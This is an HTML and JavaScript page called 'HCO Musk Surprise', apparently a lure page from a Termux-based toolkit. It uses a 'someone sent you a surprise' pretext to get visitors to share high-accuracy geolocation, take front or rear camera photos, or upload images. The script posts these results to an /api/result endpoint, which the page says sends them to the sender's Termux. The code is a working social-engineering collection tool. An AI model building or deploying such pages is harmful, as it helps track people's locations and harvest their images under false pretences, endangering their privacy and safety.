
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#07130f">
<title>HCO Musk Surprise</title>

<style>
*{box-sizing:border-box}
body{
 margin:0;min-height:100vh;display:grid;place-items:center;
 padding:18px;background:radial-gradient(circle at top,#17442f,#07130f 65%);
 font-family:system-ui,Arial;color:#effff7
}
main{
 width:min(580px,100%);padding:25px;border-radius:22px;
 background:#0c1c15;border:1px solid #286044;
 box-shadow:0 20px 60px #0009
}
.logo{text-align:center;color:#36e6a5;font-size:39px;font-weight:900;letter-spacing:4px}
.sub{text-align:center;color:#a6c4b7;font-size:12px;letter-spacing:2px;margin-bottom:25px}
h1{font-size:25px}
.note{background:#10291e;border:1px solid #386c51;border-radius:12px;padding:13px;color:#d7ffea}
button{
 padding:14px 17px;margin:8px 5px 5px 0;border:0;border-radius:11px;
 background:#36e6a5;color:#042015;font-weight:800;font-size:15px;cursor:pointer
}
.secondary{background:#244b38;color:white}
video{display:none;width:100%;margin-top:15px;border-radius:12px;background:#000}
.status{white-space:pre-wrap;overflow-wrap:anywhere;line-height:1.6;margin-top:16px;color:#c5ddd1}
iframe{display:none;width:100%;height:250px;border:0;border-radius:12px;margin-top:15px}
.foot{text-align:center;color:#89a99a;font-size:12px;margin-top:22px;border-top:1px solid #234333;padding-top:15px}
.hide{display:none}
</style>
</head>

<body>
<main>

<div class="logo">🎁 HCO MUSK</div>
<div class="sub">SURPRISE PORTAL • BY HCO TEAM AZHAR</div>

<h1 id="title">💚 Someone sent you a surprise!</h1>

<p id="intro">A little surprise is waiting for you!</p>

<div class="note" id="notice">
✨ Your surprise is ready!
</div>

<div>

<button id="reveal">🎁 Reveal Surprise</button>

<button id="loc" class="hide">
📍 Share & Reveal
</button>

<button id="rear" class="hide">
📷 Start Rear Camera
</button>

<button id="front" class="hide">
🤳 Start Front Camera
</button>

<button id="capture" class="secondary hide">
💚 Capture & Send Photo
</button>

<button id="stop" class="secondary hide">
⏹ Stop Camera
</button>

<button id="choosePhoto" class="hide">
🖼 Choose a Photo
</button>

<input
 id="photoFile"
 type="file"
 accept="image/jpeg,image/png"
 class="hide"
>

<button id="sendPhoto" class="hide">
📤 Share Selected Photo
</button>

</div>

<div id="out" class="status" aria-live="polite"></div>

<iframe id="map" title="Location map"></iframe>

<video id="video" autoplay playsinline></video>

<div class="foot">
💚 HCO Musk • By HCO Team Azhar
</div>

</main>

<script>

const q = new URLSearchParams(location.search);

const mode = q.get("mode") || "custom";
const token = q.get("token") || "";
const message = q.get("message") || "🎉 Surprise! You found it!";

const title = document.getElementById("title");
const intro = document.getElementById("intro");
const notice = document.getElementById("notice");
const out = document.getElementById("out");

const reveal = document.getElementById("reveal");
const loc = document.getElementById("loc");
const rear = document.getElementById("rear");
const front = document.getElementById("front");
const capture = document.getElementById("capture");
const stop = document.getElementById("stop");
const choosePhoto = document.getElementById("choosePhoto");
const photoFile = document.getElementById("photoFile");
const sendPhoto = document.getElementById("sendPhoto");
const video = document.getElementById("video");

let stream = null;

title.textContent =
    q.get("title") || "💚 Someone sent you a surprise!";


function show(el){
    el.classList.remove("hide");
}

function hide(el){
    el.classList.add("hide");
}


/* SEND RESULTS TO HCO TERMUX */

async function sendResult(data){

    if(!token){
        throw new Error(
            "Invalid surprise link. Please ask the sender for a new link."
        );
    }

    const response = await fetch(
        "/api/result?token=" + encodeURIComponent(token),
        {
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                ...data,
                mode:mode
            })
        }
    );

    if(!response.ok){
        throw new Error(
            "Result could not reach HCO Musk. Ask the sender to check the connection."
        );
    }

    return response.json();
}


/* SECRET MESSAGE */

if(mode === "custom"){

    intro.textContent =
        "💌 Someone has sent you a special message! Tap below to reveal it.";

    notice.textContent =
        "🎁 Your surprise is waiting!";

    hide(reveal);

    reveal.textContent = "💌 Open Secret Message";
    show(reveal);

    reveal.onclick = async () => {

        out.textContent = "🎉 Opening your surprise...";

        try{

            await sendResult({
                type:"message_revealed",
                message:message
            });

            out.textContent =
                "💚 SURPRISE REVEALED!\n\n" + message;

        }catch(error){

            out.textContent = error.message;

        }
    };
}


/* LOCATION SURPRISE */

if(mode === "location" || mode === "location-map"){

    intro.textContent =
        "📍 A location surprise is waiting for you! Tap below to share your location with the sender and reveal the surprise.";

    notice.textContent =
        "💚 Share your location if you want to reveal this surprise.";

    hide(reveal);
    show(loc);

    loc.onclick = () => {

        if(!navigator.geolocation){
            out.textContent =
                "Location is not supported by this browser.";
            return;
        }

        out.textContent =
            "📍 Waiting for your location permission...";

        navigator.geolocation.getCurrentPosition(

            async pos => {

                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const accuracy = pos.coords.accuracy;

                try{

                    await sendResult({
                        type:"location",
                        latitude:lat,
                        longitude:lon,
                        accuracy:accuracy
                    });

                    out.textContent =
                        "🎉 LOCATION SURPRISE REVEALED!\n\n" +
                        "📍 Your location was shared with the sender.\n" +
                        "Latitude: " + lat + "\n" +
                        "Longitude: " + lon + "\n" +
                        "Accuracy: " + Math.round(accuracy) + " metres";

                    const map =
                        document.getElementById("map");

                    map.src =
                        `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;

                    map.style.display = "block";

                }catch(error){

                    out.textContent = error.message;

                }

            },

            error => {

                out.textContent =
                    "Location was not shared: " + error.message;

            },

            {
                enableHighAccuracy:true,
                timeout:20000,
                maximumAge:0
            }

        );
    };
}


/* CAMERA SURPRISE */

if(
    mode === "camera" ||
    mode === "camera-front" ||
    mode === "camera-rear"
){

    intro.textContent =
        "📸 A camera surprise is waiting! Choose your camera to reveal it.";

    notice.textContent =
        "💚 Start your camera and capture a photo only if you choose.";

    hide(reveal);

    if(mode === "camera-front"){
        show(front);
    }
    else if(mode === "camera-rear"){
        show(rear);
    }
    else{
        show(front);
        show(rear);
    }
}


async function startCamera(facing){

    try{

        if(!navigator.mediaDevices?.getUserMedia){

            throw new Error(
                "Camera requires a supported browser and HTTPS."
            );
        }

        if(stream){
            stream.getTracks().forEach(t => t.stop());
        }

        stream = await navigator.mediaDevices.getUserMedia({

            video:{
                facingMode:{
                    ideal:facing
                }
            },

            audio:false

        });

        video.srcObject = stream;
        video.style.display = "block";

        show(capture);
        show(stop);

        out.textContent =
            "📸 Camera preview is ready. Capture is optional.";

    }
    catch(error){

        out.textContent =
            "Camera could not start: " + error.message;

    }
}


front.onclick = () => startCamera("user");

rear.onclick = () => startCamera("environment");


/* CAPTURE AND SEND CAMERA PHOTO */

capture.onclick = async () => {

    if(!video.videoWidth){

        out.textContent =
            "Camera is not ready.";

        return;
    }

    const canvas = document.createElement("canvas");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    canvas.getContext("2d").drawImage(
        video,
        0,
        0
    );

    out.textContent =
        "📤 Sending your selected camera photo...";

    try{

        const image =
            canvas.toDataURL("image/jpeg",0.85);

        await sendResult({
            type:"camera_photo",
            image:image
        });

        out.textContent =
            "🎉 PHOTO SENT!\n\nYour selected photo reached the sender's Termux.";

    }
    catch(error){

        out.textContent = error.message;

    }
};


/* STOP CAMERA */

stop.onclick = () => {

    if(stream){
        stream.getTracks().forEach(t => t.stop());
    }

    stream = null;

    video.srcObject = null;
    video.style.display = "none";

    hide(capture);
    hide(stop);

    out.textContent =
        "Camera stopped.";
};


/* PHOTO SURPRISE */

if(mode === "photo"){

    intro.textContent =
        "🖼 Someone sent you a photo surprise! Choose a photo if you want to share one.";

    notice.textContent =
        "💚 You choose which photo to send.";

    hide(reveal);
    show(choosePhoto);

    choosePhoto.onclick = () => {
        photoFile.click();
    };

    photoFile.onchange = () => {

        show(sendPhoto);

        out.textContent = photoFile.files.length
            ? "Selected: " + photoFile.files[0].name
            : "No photo selected.";
    };

    sendPhoto.onclick = async () => {

        const file = photoFile.files[0];

        if(!file){
            out.textContent =
                "Please choose a photo first.";
            return;
        }

        if(!["image/jpeg","image/png"].includes(file.type)){
            out.textContent =
                "Choose a JPG or PNG photo.";
            return;
        }

        if(file.size > 5 * 1024 * 1024){
            out.textContent =
                "Please choose a photo smaller than 5 MB.";
            return;
        }

        const reader = new FileReader();

        reader.onload = async () => {

            try{

                await sendResult({
                    type:"photo_upload",
                    image:reader.result
                });

                out.textContent =
                    "🎉 PHOTO SENT!\n\nYour selected photo reached the sender's Termux.";

            }
            catch(error){

                out.textContent = error.message;

            }
        };

        reader.onerror = () => {
            out.textContent =
                "Could not read the selected photo.";
        };

        reader.readAsDataURL(file);
    };
}


/* STOP CAMERA WHEN PAGE CLOSES */

window.addEventListener("pagehide",() => {

    if(stream){
        stream.getTracks().forEach(t => t.stop());
    }

});

</script>

</body>
</html>
